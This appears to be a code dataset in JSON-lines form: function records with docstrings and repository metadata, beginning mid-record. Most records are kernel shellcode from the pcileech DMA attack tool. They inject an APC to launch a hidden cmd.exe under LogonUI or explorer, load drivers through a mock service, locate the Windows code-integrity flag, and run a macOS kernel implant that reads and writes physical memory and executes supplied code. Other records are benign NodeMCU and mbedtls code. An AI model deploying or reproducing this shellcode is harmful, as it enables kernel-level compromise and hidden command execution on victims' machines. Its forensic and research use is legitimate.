_WIN7_COMPAT\n\telse {\n\t\t// Windows 7 fallback to more complicated KeInsertQueueApc method.\n\t\tActionDefault_QueueApcState(pk, fnk, fnk2, Process, ApcState, pvAddressUserMode);\n\t}\n#endif /* _WIN7_COMPAT */\nfail:\n\tif(ZwProcessHandle) { fnk->ZwClose(ZwProcessHandle); }\n\tif(Process) { fnk2->ObDereferenceObject(Process); }\n}", "path": "pcileech/pcileech_shellcode/wx64_pscreate.c", "commit_date": "2017-12-17 00:00:00", "repo_name": "ufrisk/pcileech", "stars": 4176, "license": "agpl-3.0", "language": "c", "size": 4614}
{"docstring": "/*\n* Locate the PKAPC_STATE struct inside the PETHREAD opaque structure by searching for\n* the first occurance of a reference to the PEPROCESS address location.\n*/\n", "func_signal": "PKAPC_STATE GetKApcState(_In_ PEPROCESS pEProcess, _In_ PETHREAD pEThread)", "code": "{\n\tfor(DWORD offset = 0; offset < 256; offset += 8) {\n\t\tif((QWORD)pEProcess == *(PQWORD)((QWORD)pEThread + offset)) {\n\t\t\treturn (PKAPC_STATE)((QWORD)pEThread + offset - 32);\n\t\t}\n\t}\n\treturn NULL;\n}", "path": "pcileech/pcileech_shellcode/wx64_pscreate.c", "commit_date": "2017-12-17 00:00:00", "repo_name": "ufrisk/pcileech", "stars": 4176, "license": "agpl-3.0", "language": "c", "size": 4614}
{"docstring": "/*\n* Check if the file exists - if so return a PUNICODE_STRING containing the file name.\n* NB! the pusImagePath parameter must be free'd by RtlFreeUnicodeString by caller upon success.\n*/\n", "func_signal": "NTSTATUS DriverRegGetImagePath(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2, _Out_ PUNICODE_STRING pusImagePath)", "code": "{\n\tNTSTATUS nt;\n\tHANDLE hFile = NULL;\n\tIO_STATUS_BLOCK _io;\n\tOBJECT_ATTRIBUTES _oa;\n\tANSI_STRING _sa;\n\tUNREFERENCED_PARAMETER(fnk2);\n\t// check if file exists\n\tfnk->RtlInitAnsiString(&_sa, pk->dataInStr);\n\tfnk->RtlCopyMemory(pk->dataOutStr, pk->dataInStr, 260);\n\tfnk->RtlAnsiStringToUnicodeString(pusImagePath, &_sa, TRUE);\n\tfnk->RtlZeroMemory(&_oa, sizeof(OBJECT_ATTRIBUTES));\n\tfnk->RtlZeroMemory(&_io, sizeof(IO_STATUS_BLOCK));\n\tInitializeObjectAttributes(&_oa, pusImagePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);\n\tnt = fnk->ZwCreateFile(&hFile, GENERIC_READ, &_oa, &_io, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);\n\tif(hFile) {\n\t\tfnk->ZwClose(hFile);\n\t}\n\tif(NT_ERROR(nt)) {\n\t\tfnk->RtlFreeUnicodeString(pusImagePath);\n\t\treturn nt;\n\t}\n\treturn ERROR_SUCCESS;\n}", "path": "pcileech/pcileech_shellcode/wx64_driverload_svc.c", "commit_date": "2016-08-09 00:00:00", "repo_name": "ufrisk/pcileech", "stars": 4176, "license": "agpl-3.0", "language": "c", "size": 4614}
{"docstring": "/*\n* Set required values into a service registry key\n*/\n", "func_signal": "VOID DriverRegSetServiceKeys(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2, _In_ HANDLE hKeyHandle, _In_ PUNICODE_STRING pusImagePath)", "code": "{\n\tWCHAR WSZ_ErrorControl[] = { 'E', 'r', 'r', 'o', 'r', 'C', 'o', 'n', 't', 'r', 'o', 'l', 0 };\n\tWCHAR WSZ_ImagePath[] = { 'I', 'm', 'a', 'g', 'e', 'P', 'a', 't', 'h', 0 };\n\tWCHAR WSZ_Start[] = { 'S', 't', 'a', 'r', 't', 0 };\n\tWCHAR WSZ_Type[] = { 'T', 'y', 'p', 'e', 0 };\n\tDWORD dwValue0 = 0, dwValue1 = 1, dwValue3 = 3;\n\tUNICODE_STRING usErrorControl, usImagePath, usStart, usType;\n\tUNREFERENCED_PARAMETER(pk);\n\tUNREFERENCED_PARAMETER(fnk2);\n\tfnk->RtlInitUnicodeString(&usErrorControl, WSZ_ErrorControl);\n\tfnk->RtlInitUnicodeString(&usImagePath, WSZ_ImagePath);\n\tfnk->RtlInitUnicodeString(&usStart, WSZ_Start);\n\tfnk->RtlInitUnicodeString(&usType, WSZ_Type);\n\tfnk2->ZwSetValueKey(hKeyHandle, &usStart, 0, REG_DWORD, (PVOID)&dwValue3, sizeof(DWORD)); // 3 = Load on Demand\n\tfnk2->ZwSetValueKey(hKeyHandle, &usType, 0, REG_DWORD, (PVOID)&dwValue1, sizeof(DWORD)); // 1 = Kernel Device Driver\n\tfnk2->ZwSetValueKey(hKeyHandle, &usErrorControl, 0, REG_DWORD, (PVOID)&dwValue0, sizeof(DWORD)); // 0 = Do not show warning\n\tfnk2->ZwSetValueKey(hKeyHandle, &usImagePath, 0, REG_SZ, pusImagePath->Buffer, pusImagePath->Length + 2);\n}", "path": "pcileech/pcileech_shellcode/wx64_driverload_svc.c", "commit_date": "2016-08-09 00:00:00", "repo_name": "ufrisk/pcileech", "stars": 4176, "license": "agpl-3.0", "language": "c", "size": 4614}
{"docstring": "/*\n* Module entry point.\n*/\n", "func_signal": "VOID c_EntryPoint(_In_ PKMDDATA pk)", "code": "{\n\tKERNEL_FUNCTIONS fnk;\n\tKERNEL_FUNCTIONS2 fnk2;\n\tInitializeKernelFunctions(pk->AddrKernelBase, &fnk);\n\tInitializeKernelFunctions2(pk->AddrKernelBase, &fnk2);\n#ifdef _PSCMD_SYSTEM\n\tCHAR szBINARY[] = { 'L', 'o', 'g', 'o', 'n', 'U', 'I', '.', 'e', 'x', 'e', 0 };\n#endif _PSCMD_SYSTEM\n#ifdef _PSCMD_USER\n\tCHAR szBINARY[] = { 'e', 'x', 'p', 'l', 'o', 'r', 'e', 'r', '.', 'e', 'x', 'e', 0 };\n#endif _PSCMD_USER\n#ifdef _PSCMD\n\tCHAR szCMD[] = { 'c', ':', '\\\\', 'w', 'i', 'n', 'd', 'o', 'w', 's', '\\\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\\\', 'c', 'm', 'd', '.', 'e', 'x', 'e', 0 };\n\tpk->dataIn[1] = 0x08000000; // hidden window\n\tpk->dataIn[2] = 1; // interactive\n\tpk->dataIn[4] = 1; // multi thread hijack (boost)\n\tpk->dataOut[0] = GetPidFromPsName(&fnk, &fnk2, szBINARY, &pk->dataIn[0]);\n\tif(pk->dataOut[0]) {\n\t\tpk->dataOut[1] = 0x101;\n\t\treturn;\n\t}\n\tfnk.RtlCopyMemory(pk->dataInStr, szCMD, sizeof(szCMD));\n#endif _PSCMD\n\tActionDefault(pk, &fnk, &fnk2);\n}", "path": "pcileech/pcileech_shellcode/wx64_pscreate.c", "commit_date": "2017-12-17 00:00:00", "repo_name": "ufrisk/pcileech", "stars": 4176, "license": "agpl-3.0", "language": "c", "size": 4614}
{"docstring": "/*\n* Wait for dataIn[3] (default: 60) seconds or until pk->dataOut[9] is set to MAGIC_WAIT_WORD value\n*/\n", "func_signal": "VOID ActionWaitForExit(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk)", "code": "{\n\tLONGLONG llTimeSecond = -1000000; // 100ms\n\tQWORD i, max;\n\tmax = pk->dataIn[3] ? pk->dataIn[3] : 60;\n\tmax *= 10;\n\tfor(i = 0; i < max; i++) {\n\t\tif(pk->dataOut[9] == MAGIC_WAIT_WORD) {\n\t\t\tpk->dataOut[9] = 0;\n\t\t\treturn;\n\t\t}\n\t\tfnk->KeDelayExecutionThread(KernelMode, FALSE, &llTimeSecond);\n\t}\n\tpk->dataOut[0] = ERROR_TIMEOUT;\n\tpk->dataOut[9] = 0;\n}", "path": "pcileech/pcileech_shellcode/wx64_pscreate.c", "commit_date": "2017-12-17 00:00:00", "repo_name": "ufrisk/pcileech", "stars": 4176, "license": "agpl-3.0", "language": "c", "size": 4614}
{"docstring": "/*\n* Retrieve the address of the code integrity flag\n* see: https://github.com/hfiref0x/DSEFix/blob/master/Source/ci-hunter\n*/\n", "func_signal": "QWORD GetAddr_g_CiEnabled(QWORD qwAddrModuleCi)", "code": "{\n\tQWORD qwA;\n\tDWORD i = 0, j = 0;\n\tqwA = PEGetProcAddressH(qwAddrModuleCi, H_CiInitialize);\n\tif(!qwA) {\n\t\treturn 0;\n\t}\n\tdo {\n\t\t// JMP to CiInitialize sub function\n\t\t// TODO: add proper dasm instead of trivial opcode-scanning\n\t\tif(*(PBYTE)(qwA + i) == 0xE9) {\n\t\t\tqwA = qwA + i + 5 + *(PLONG)(qwA + i + 1);\n\t\t\tdo {\n\t\t\t\t// Scan for MOV to g_CiEnabled\n\t\t\t\tif(*(PUSHORT)(qwA + j) == 0x0D89) {\n\t\t\t\t\treturn qwA + j + 6 + *(PLONG)(qwA + j + 2);\n\t\t\t\t}\n\t\t\t\tj++;\n\t\t\t} while(j < 256);\n\t\t\treturn 0;\n\t\t}\n\t\ti++;\n\t} while(i < 128);\n\treturn 0;\n}", "path": "pcileech/pcileech_shellcode/wx64_driverload_svc.c", "commit_date": "2016-08-09 00:00:00", "repo_name": "ufrisk/pcileech", "stars": 4176, "license": "agpl-3.0", "language": "c", "size": 4614}
{"docstring": "// status:\n//     1: ready for command\n//     2: processing\n//     f0000000: terminated\n//     f0000000+: error\n// op: - see KMD_CMD defines\n// result:\n//    0: FALSE\n//    1: TRUE\n// address:\n//    physical base address for memory operation\n// size:\n//    size of memory operation\n", "func_signal": "VOID stage3_c_EntryPoint(PKMDDATA pk)", "code": "{\n\tQWORD qwBufferOutDMA, qwBufferOutDMA_Phys;\n\tQWORD qwPT_PA, qwPT_VA, qwCR3;\n\tQWORD i, idleCount = 0;\n\t// 0: set up symbols and kmd data\n\tpk->MAGIC = 0x0ff11337711333377;\n\tpk->OperatingSystem = KMDDATA_OPERATING_SYSTEM_MACOS;\n\tif(!LookupFunctionsDefaultOSX(pk->AddrKernelBase, (QWORD)&pk->fn)) {\n\t\tpk->_status = 0xf0000001;\n\t\treturn;\n\t}\n\t// 1: set up mem out DMA area 4MB/16MB in lower 4GB\n\tpk->DMASizeBuffer = 0x1000000;\n\tqwBufferOutDMA = SysVCall(pk->fn.IOMallocContiguous, 0x01000000, 12, &qwBufferOutDMA_Phys);\n\tif(!qwBufferOutDMA) {\n\t\tpk->DMASizeBuffer = 0x00400000;\n\t\tqwBufferOutDMA = SysVCall(pk->fn.IOMallocContiguous, 0x00400000, 12, &qwBufferOutDMA_Phys);\n\t}\n\tif(!qwBufferOutDMA) {\n\t\tpk->DMASizeBuffer = 0;\n\t\tpk->_status = 0xf0000002;\n\t\treturn;\n\t}\n\tif(!qwBufferOutDMA_Phys || qwBufferOutDMA_Phys > (0x100000000 - pk->DMASizeBuffer)) {\n\t\tpk->_status = 0xf0000003;\n\t\treturn;\n\t}\n\tpk->DMAAddrPhysical = qwBufferOutDMA_Phys;\n\tpk->DMAAddrVirtual = qwBufferOutDMA;\n\tSysVCall(pk->fn.vm_protect, *(PQWORD)pk->fn._kernel_map, qwBufferOutDMA, pk->DMASizeBuffer, 0, 7);\n\t// 2: set up page tables - used to read physical memory @ 0xffffee8000000000\n\tqwCR3 = GetCR3();\n\tqwPT_VA = SysVCall(pk->fn.IOMallocContiguous, 0xA000, 12, &qwPT_PA);\n\tif(!qwPT_VA || (qwPT_VA & 0xfff)) {\n\t\tpk->_status = 0xf0000004;\n\t\treturn;\n\t}\n\tSysVCall(pk->fn.memset, qwPT_VA, 0, 0xA000);\n\tfor(i = 0; i < 8; i++) { // PD -> PT*8 (512*8*4k=16M)\n\t\t((PQWORD)(qwPT_VA + 0x1000))[i] = 0x0000000000000023 | (qwPT_PA + 0x1000 * (i + 2));\n\t}\n\t*(PQWORD)(qwPT_VA + 0x0000) = 0x0000000000000023 | (qwPT_PA + 0x1000); // PDPT -> PD\n\t*(PQWORD)(VM_MIN_KERNEL_ADDRESS + (qwCR3 & 0x00000000fffff000) + 0xEE8) = 0x0000000000000023 | qwPT_PA; // PML4 -> PDPT\n\tpk->ReservedKMD[0] = qwPT_VA;\n\t// 3: main command loop.\n\twhile(TRUE) {\n\t\tpk->_status = 1;\n\t\tif(KMD_CMD_COMPLETED == pk->_op) { // NOP\n\t\t\tidleCount++;\n\t\t\t// thread wait after X number of idle loops - TODO: change to timing\n\t\t\tif(idleCount > 10000000000) {\n\t\t\t\tSysVCall(pk->fn.IOSleep, 100);\n\t\t\t}\n\t\t\tcontinue;\n\t\t}\n\t\tpk->_status = 2;\n\t\tif(KMD_CMD_TERMINATE == pk->_op) { // EXIT\n\t\t\tpk->_status = 0xf0000000;\n\t\t\tSysVCall(pk->fn.IOFreeContiguous, qwBufferOutDMA, 0x01000000);\n\t\t\tpk->DMAAddrPhysical = 0;\n\t\t\tpk->DMAAddrVirtual = 0;\n\t\t\t*(PQWORD)(VM_MIN_KERNEL_ADDRESS + (qwCR3 & 0x00000000fffff000) + 0xEE8) = 0;\n\t\t\tSysVCall(pk->fn.IOFreeContiguous, qwPT_VA, 0xA000);\n\t\t\tpk->_result = TRUE;\n\t\t\tpk->MAGIC = 0;\n\t\t\tpk->_op = KMD_CMD_COMPLETED;\n\t\t\treturn;\n\t\t}\n\t\tif(KMD_CMD_MEM_INFO == pk->_op) { // INFO (physical section map)\n\t\t\tpk->_result = GetMemoryMap(pk, (PBYTE)pk->DMAAddrVirtual, &pk->_size);\n\t\t}\n\t\tif(KMD_CMD_EXEC == pk->_op) { // EXEC at start of buffer\n\t\t\t((VOID(*)(PKMDDATA pk, PQWORD dataIn, PQWORD dataOut))qwBufferOutDMA)(pk, pk->dataIn, pk->dataOut);\n\t\t\tpk->_result = TRUE;\n\t\t}\n\t\tif(KMD_CMD_READ == pk->_op || KMD_CMD_WRITE == pk->_op) { // PHYSICAL MEMORY READ/WRITE\n\t\t\tfor(i = 0; i < 512 * 8; i++) { // PT*8 -> Pages\n\t\t\t\t((PQWORD)(qwPT_VA + 0x2000))[i] = 0x8000000000000003 | ((pk->_address & 0x7ffffffffffff000) + 0x1000 * i);\n\t\t\t}\n\t\t\tPageFlush();\n\t\t\tif(KMD_CMD_READ == pk->_op) { // READ\n\t\t\t\tSysVCall(pk->fn.memcpy, qwBufferOutDMA, 0xffffee8000000000 + (pk->_address & 0xfff), pk->_size);\n\t\t\t} else { // WRITE\n\t\t\t\tSysVCall(pk->fn.memcpy, 0xffffee8000000000 + (pk->_address & 0xfff), qwBufferOutDMA, pk->_size);\n\t\t\t}\n\t\t\tpk->_result = TRUE;\n\t\t}\n\t\tif(KMD_CMD_READ_VA == pk->_op) { // READ Virtual Address\n\t\t\tSysVCall(pk->fn.memcpy, qwBufferOutDMA, pk->_address, pk->_size);\n\t\t\tpk->_result = TRUE;\n\t\t}\n\t\tif(KMD_CMD_WRITE_VA == pk->_op) { // WRITE Virtual Address\n\t\t\tSysVCall(pk->fn.memcpy, pk->_address, qwBufferOutDMA, pk->_size);\n\t\t\tpk->_result = TRUE;\n\t\t}\n\t\tpk->_op = KMD_CMD_COMPLETED;\n\t\tidleCount = 0;\n\t}\n}", "path": "pcileech/pcileech_shellcode/macos_stage3_c.c", "commit_date": "2017-12-17 00:00:00", "repo_name": "ufrisk/pcileech", "stars": 4176, "license": "agpl-3.0", "language": "c", "size": 4614}
{"docstring": "/*\n* Load a driver by image path by creating a mock service, load the driver and then deleting the mock service.\n*/\n", "func_signal": "NTSTATUS DriverLoadByImagePath(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2)", "code": "{\n\tNTSTATUS nt;\n\tWCHAR wszServicePath[MAX_PATH];\n\tUNICODE_STRING usServicePath;\n\tDWORD i;\n\tnt = DriverRegCreateService(pk, fnk, fnk2, wszServicePath);\n\tif(NT_ERROR(nt)) {\n\t\treturn nt;\n\t}\n\tfor(i = 0; i < MAX_PATH; i++) {\n\t\tpk->dataOutStr[i] = (CHAR)wszServicePath[i];\n\t}\n\tfnk->RtlInitUnicodeString(&usServicePath, wszServicePath);\n\treturn fnk2->ZwLoadDriver(&usServicePath);\n}", "path": "pcileech/pcileech_shellcode/wx64_driverload_svc.c", "commit_date": "2016-08-09 00:00:00", "repo_name": "ufrisk/pcileech", "stars": 4176, "license": "agpl-3.0", "language": "c", "size": 4614}
{"docstring": "/*\n* Get the Name (data after last \\) given a null terminated string.\n*/\n", "func_signal": "LPWSTR DriverRegGetImageNameFromPath(LPWSTR wszSrc)", "code": "{\n\tDWORD i = 0, j = 0;\n\twhile(wszSrc[i] != 0) {\n\t\tif(wszSrc[i] == '\\\\') {\n\t\t\tj = i + 1;\n\t\t}\n\t\ti++;\n\t}\n\treturn &wszSrc[j];\n}", "path": "pcileech/pcileech_shellcode/wx64_driverload_svc.c", "commit_date": "2016-08-09 00:00:00", "repo_name": "ufrisk/pcileech", "stars": 4176, "license": "agpl-3.0", "language": "c", "size": 4614}
{"docstring": "//-------------------------------------------------------------------------------\n// Dokan Callback functions below:\n//-------------------------------------------------------------------------------\n", "func_signal": "NTSTATUS DOKAN_CALLBACK\nVfsCallback_CreateFile(LPCWSTR wcsFileName, PDOKAN_IO_SECURITY_CONTEXT SecurityContext, ACCESS_MASK DesiredAccess, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PDOKAN_FILE_INFO DokanFileInfo)", "code": "{\n    PVFS_GLOBAL_STATE pds = (PVFS_GLOBAL_STATE)DokanFileInfo->DokanOptions->GlobalContext;\n    BOOL result;\n    VFS_RESULT_FILEINFO fi;\n    //VFS_OPERATION op;\n    UNREFERENCED_PARAMETER(SecurityContext);\n    UNREFERENCED_PARAMETER(FileAttributes);\n    UNREFERENCED_PARAMETER(CreateOptions);\n    // root, file or proc directory\n    if(!wcscmp(wcsFileName, L\"\\\\\") || (pds->fKMD && !_wcsicmp(wcsFileName, L\"\\\\files\"))) {\n        if(CreateDisposition != CREATE_NEW && CreateDisposition != OPEN_ALWAYS && CreateDisposition != OPEN_EXISTING) {\n            return pds->DokanNtStatusFromWin32(ERROR_ACCESS_DENIED);\n        }\n        DokanFileInfo->IsDirectory = TRUE;\n        return STATUS_SUCCESS;\n    }\n    // ram dump file\n    if(!_wcsicmp(wcsFileName, L\"\\\\liveram-raw.raw\") || !_wcsicmp(wcsFileName, L\"\\\\liveram-native.raw\")) {\n        if(DokanFileInfo->IsDirectory) {\n            return STATUS_NOT_A_DIRECTORY;\n        }\n        if(CreateDisposition != CREATE_NEW && CreateDisposition != OPEN_ALWAYS && CreateDisposition != OPEN_EXISTING) {\n            return pds->DokanNtStatusFromWin32(ERROR_ACCESS_DENIED);\n        }\n        DokanFileInfo->Nocache = TRUE;\n        if(CreateDisposition == OPEN_ALWAYS) {\n            return STATUS_OBJECT_NAME_COLLISION;\n        }\n        return STATUS_SUCCESS;\n    }\n    // matches: \\files*\n    if(!_wcsnicmp(wcsFileName, L\"\\\\files\", 6) && pds->fKMD) {\n        if(CreateDisposition != CREATE_NEW && CreateDisposition != OPEN_ALWAYS && CreateDisposition != OPEN_EXISTING) {\n            pds->DokanNtStatusFromWin32(ERROR_ACCESS_DENIED);\n        }\n        result = Vfs_ListSingle(wcsFileName, DokanFileInfo, &fi);\n        /*\n        TODO: allow create new files some time in the future.\n        if(!result) {\n            if(CreateDisposition == CREATE_NEW || CreateDisposition == OPEN_ALWAYS) {\n                result = _Vfs_InitVfsOperation(&op, VFS_OP_CMD_CREATE, wcsFileName, DokanFileInfo);\n                if(!result) { return STATUS_FILE_INVALID; }\n                EnterCriticalSection(&pds->LockDma);\n                Exec_ExecSilent(pds->pCfg, pds->pDeviceData, pds->szNameVfsShellcode, (PBYTE)&op, sizeof(VFS_OPERATION), NULL, NULL);\n                LeaveCriticalSection(&pds->LockDma);\n                VfsCache_DirectoryDel(wcsFileName, DokanFileInfo, FALSE);\n            }\n            result = _Vfs_ListSingle(wcsFileName, DokanFileInfo, &fi);\n        }\n        */\n        if(!result) { \n            return STATUS_FILE_INVALID; \n        }\n        DokanFileInfo->IsDirectory = (fi.flags & VFS_FLAGS_FILE_DIRECTORY) ? TRUE : FALSE;\n        DokanFileInfo->Nocache = TRUE;\n        return (CreateDisposition == OPEN_ALWAYS) ? STATUS_OBJECT_NAME_COLLISION : STATUS_SUCCESS;\n    }\n    return STATUS_SUCCESS;\n}", "path": "pcileech/pcileech/vfs.c", "commit_date": "2020-08-03 00:00:00", "repo_name": "ufrisk/pcileech", "stars": 4176, "license": "agpl-3.0", "language": "c", "size": 4614}
{"docstring": "/*\n* Retrieve a suitable thread that may be used to queue the APC onto.\n*/\n", "func_signal": "PETHREAD GetPEThread(_In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2, _In_ HANDLE UniqueProcessId, _In_ PEPROCESS pEProcess, _In_ DWORD cSkipThreads)", "code": "{\n\tNTSTATUS nt;\n\tPSYSTEM_PROCESS_INFORMATION pPI;\n\tPSYSTEM_THREAD_INFORMATION pTI;\n\tPETHREAD pEThread = NULL;\n\tHANDLE UniqueThreadId;\n\tPBYTE pbSPIBuffer;\n\tULONG cbSPIBuffer = 0;\n\tQWORD i = 0;\n\tnt = fnk->ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &cbSPIBuffer);\n\tif(nt != 0xC0000004 || !cbSPIBuffer) {\n\t\treturn nt;\n\t}\n\tpbSPIBuffer = (PBYTE)fnk->ExAllocatePool(0, cbSPIBuffer);\n\tif(!pbSPIBuffer) { return NULL; }\n\tnt = fnk->ZwQuerySystemInformation(SystemProcessInformation, pbSPIBuffer, cbSPIBuffer, &cbSPIBuffer);\n\tif(NT_SUCCESS(nt)) {\n\t\tpPI = (PSYSTEM_PROCESS_INFORMATION)pbSPIBuffer;\n\t\twhile(TRUE) {\n\t\t\tif(pPI->UniqueProcessId == UniqueProcessId) {\n\t\t\t\tfor(i = 0; i < pPI->NumberOfThreads; i++) {\n\t\t\t\t\t// TODO: check ThreadInfos internal offset on Win7/Win8 (Win10 = OK)\n\t\t\t\t\tpTI = (PSYSTEM_THREAD_INFORMATION)&pPI->ThreadInfos[i];\n\t\t\t\t\tUniqueThreadId = pTI->ClientId.UniqueThread;\n\t\t\t\t\tnt = fnk2->PsLookupThreadByThreadId(UniqueThreadId, &pEThread);\n\t\t\t\t\tif(NT_ERROR(nt) || !GetKApcIsAlertable(pEProcess, pEThread)) {\n\t\t\t\t\t\tcontinue;\n\t\t\t\t\t}\n\t\t\t\t\tif(cSkipThreads) {\n\t\t\t\t\t\tcSkipThreads--;\n\t\t\t\t\t\tcontinue;\n\t\t\t\t\t}\n\t\t\t\t\tfnk->ExFreePool(pbSPIBuffer);\n\t\t\t\t\treturn pEThread;\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tif(!pPI->NextEntryOffset) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tpPI = (PSYSTEM_PROCESS_INFORMATION)((QWORD)pPI + pPI->NextEntryOffset);\n\t\t\tif(((QWORD)pPI < (QWORD)pbSPIBuffer) || ((QWORD)pPI > (QWORD)pbSPIBuffer + cbSPIBuffer)) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\tfnk->ExFreePool(pbSPIBuffer);\n\treturn NULL;\n}", "path": "pcileech/pcileech_shellcode/wx64_pscreate.c", "commit_date": "2017-12-17 00:00:00", "repo_name": "ufrisk/pcileech", "stars": 4176, "license": "agpl-3.0", "language": "c", "size": 4614}
{"docstring": "//== NodeMCU lua.h API extensions ============================================//\n", "func_signal": "LUA_API int lua_freeheap (void)", "code": "{\n#ifdef LUA_USE_HOST\n  return MAX_INT;\n#else\n  return (int) platform_freeheap();\n#endif\n}", "path": "nodemcu-firmware/app/lua/lnodemcu.c", "commit_date": "2020-08-22 00:00:00", "repo_name": "nodemcu/nodemcu-firmware", "stars": 7541, "license": "mit", "language": "c", "size": 112992}
{"docstring": "/*\n** Use in CBs and other C functions to call a Lua function. This includes\n** an error handler which will catch any error and then post this to the\n** registered reporter function as a separate follow-on task.\n*/\n", "func_signal": "LUALIB_API int luaL_pcallx (lua_State *L, int narg, int nres)", "code": "{ // [-narg, +0, v]\n  int status;\n  int base = lua_gettop(L) - narg;\n  lua_pushcfunction(L, errhandler);\n  lua_insert(L, base);                                      /* put under args */\n  status = lua_pcall(L, narg, nres, base);\n  lua_remove(L, base);                           /* remove traceback function */\n  if (status != LUA_OK && status != LUA_ERRRUN) {  \n    lua_gc(L, LUA_GCCOLLECT, 0);   /* call onerror directly if handler failed */\n    lua_pushliteral(L, \"out of memory\");\n    lua_pushcclosure(L, errhandler_aux, 1);            /* report EOM as upval */\n    luaL_posttask(L, LUA_TASK_HIGH);\n    }\n  return status;\n}", "path": "nodemcu-firmware/app/lua/lnodemcu.c", "commit_date": "2020-08-22 00:00:00", "repo_name": "nodemcu/nodemcu-firmware", "stars": 7541, "license": "mit", "language": "c", "size": 112992}
{"docstring": "/*\n * Return an LFS function\n */\n", "func_signal": "LUALIB_API int luaL_pushlfsmodule (lua_State *L)", "code": "{\n  if (lua_pushlfsindex(L) == LUA_TNIL) {\n    lua_remove(L,-2);  /* dump the name to balance the stack */\n    return 0;          /* return nil if LFS not loaded */\n  }\n  lua_insert(L, -2);\n  lua_call(L, 1, 1);\n  if (!lua_isfunction(L, -1)) {\n    lua_pop(L, 1);\n    lua_pushnil(L);  /* replace DTS by nil */\n  }\n  return 1;\n}", "path": "nodemcu-firmware/app/lua/lnodemcu.c", "commit_date": "2020-08-22 00:00:00", "repo_name": "nodemcu/nodemcu-firmware", "stars": 7541, "license": "mit", "language": "c", "size": 112992}
{"docstring": "/*\n * Return an array of functions in LFS\n */\n", "func_signal": "LUALIB_API int luaL_pushlfsmodules (lua_State *L)", "code": "{\n  if (lua_pushlfsindex(L) == LUA_TNIL)\n    return 0;              /* return nil if LFS not loaded */\n  lua_call(L, 0, 2);\n  lua_remove(L, -2);     /* remove DTS leaving array */\n  return 1;\n\n}", "path": "nodemcu-firmware/app/lua/lnodemcu.c", "commit_date": "2020-08-22 00:00:00", "repo_name": "nodemcu/nodemcu-firmware", "stars": 7541, "license": "mit", "language": "c", "size": 112992}
{"docstring": "/*\n * Key expansion, 256-bit case\n */\n", "func_signal": "static void aesni_setkey_enc_256( unsigned char *rk,\n                                  const unsigned char *key )", "code": "{\n    asm( \"movdqu (%1), %%xmm0           \\n\\t\"\n         \"movdqu %%xmm0, (%0)           \\n\\t\"\n         \"add $16, %0                   \\n\\t\"\n         \"movdqu 16(%1), %%xmm1         \\n\\t\"\n         \"movdqu %%xmm1, (%0)           \\n\\t\"\n         \"jmp 2f                        \\n\\t\" // skip auxiliary routine\n\n         /*\n          * Finish generating the next two round keys.\n          *\n          * On entry xmm0 is r3:r2:r1:r0, xmm1 is r7:r6:r5:r4 and\n          * xmm2 is X:stuff:stuff:stuff with X = rot( sub( r7 )) ^ RCON\n          *\n          * On exit, xmm0 is r11:r10:r9:r8 and xmm1 is r15:r14:r13:r12\n          * and those have been written to the output buffer.\n          */\n         \"1:                                \\n\\t\"\n         \"pshufd $0xff, %%xmm2, %%xmm2      \\n\\t\"\n         \"pxor %%xmm0, %%xmm2               \\n\\t\"\n         \"pslldq $4, %%xmm0                 \\n\\t\"\n         \"pxor %%xmm0, %%xmm2               \\n\\t\"\n         \"pslldq $4, %%xmm0                 \\n\\t\"\n         \"pxor %%xmm0, %%xmm2               \\n\\t\"\n         \"pslldq $4, %%xmm0                 \\n\\t\"\n         \"pxor %%xmm2, %%xmm0               \\n\\t\"\n         \"add $16, %0                       \\n\\t\"\n         \"movdqu %%xmm0, (%0)               \\n\\t\"\n\n         /* Set xmm2 to stuff:Y:stuff:stuff with Y = subword( r11 )\n          * and proceed to generate next round key from there */\n         AESKEYGENA xmm0_xmm2 \",0x00        \\n\\t\"\n         \"pshufd $0xaa, %%xmm2, %%xmm2      \\n\\t\"\n         \"pxor %%xmm1, %%xmm2               \\n\\t\"\n         \"pslldq $4, %%xmm1                 \\n\\t\"\n         \"pxor %%xmm1, %%xmm2               \\n\\t\"\n         \"pslldq $4, %%xmm1                 \\n\\t\"\n         \"pxor %%xmm1, %%xmm2               \\n\\t\"\n         \"pslldq $4, %%xmm1                 \\n\\t\"\n         \"pxor %%xmm2, %%xmm1               \\n\\t\"\n         \"add $16, %0                       \\n\\t\"\n         \"movdqu %%xmm1, (%0)               \\n\\t\"\n         \"ret                               \\n\\t\"\n\n         /*\n          * Main \"loop\" - Generating one more key than necessary,\n          * see definition of mbedtls_aes_context.buf\n          */\n         \"2:                                \\n\\t\"\n         AESKEYGENA xmm1_xmm2 \",0x01        \\n\\tcall 1b \\n\\t\"\n         AESKEYGENA xmm1_xmm2 \",0x02        \\n\\tcall 1b \\n\\t\"\n         AESKEYGENA xmm1_xmm2 \",0x04        \\n\\tcall 1b \\n\\t\"\n         AESKEYGENA xmm1_xmm2 \",0x08        \\n\\tcall 1b \\n\\t\"\n         AESKEYGENA xmm1_xmm2 \",0x10        \\n\\tcall 1b \\n\\t\"\n         AESKEYGENA xmm1_xmm2 \",0x20        \\n\\tcall 1b \\n\\t\"\n         AESKEYGENA xmm1_xmm2 \",0x40        \\n\\tcall 1b \\n\\t\"\n         :\n         : \"r\" (rk), \"r\" (key)\n         : \"memory\", \"cc\", \"0\" );\n}", "path": "nodemcu-firmware/app/mbedtls/library/aesni.c", "commit_date": "2020-06-09 00:00:00", "repo_name": "nodemcu/nodemcu-firmware", "stars": 7541, "license": "mit", "language": "c", "size": 112992}
